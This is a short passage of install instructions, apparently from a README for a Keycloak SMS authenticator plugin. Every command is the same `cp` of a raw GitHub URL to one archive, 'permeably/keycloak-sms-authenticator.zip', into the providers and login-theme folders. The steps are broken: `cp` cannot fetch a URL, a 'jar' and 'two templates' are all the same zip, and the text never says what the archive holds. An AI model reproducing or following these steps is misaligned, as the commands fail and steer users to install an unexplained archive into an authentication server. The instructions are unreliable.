...
* Add the jar to the Keycloak server:
  * `$ cp https://raw.githubusercontent.com/ducnguyenminh/keycloak-sms-authenticator/master/permeably/keycloak-sms-authenticator.zip _KEYCLOAK_HOME_/providers/`

* Add two templates to the Keycloak server:
  * `$ cp https://raw.githubusercontent.com/ducnguyenminh/keycloak-sms-authenticator/master/permeably/keycloak-sms-authenticator.zip _KEYCLOAK_HOME_/themes/base/login/`
  * `$ cp https://raw.githubusercontent.com/ducnguyenminh/keycloak-sms-authenticator/master/permeably/keycloak-sms-authenticator.zip _KEYCLOAK_HOME_/themes/base/login/`
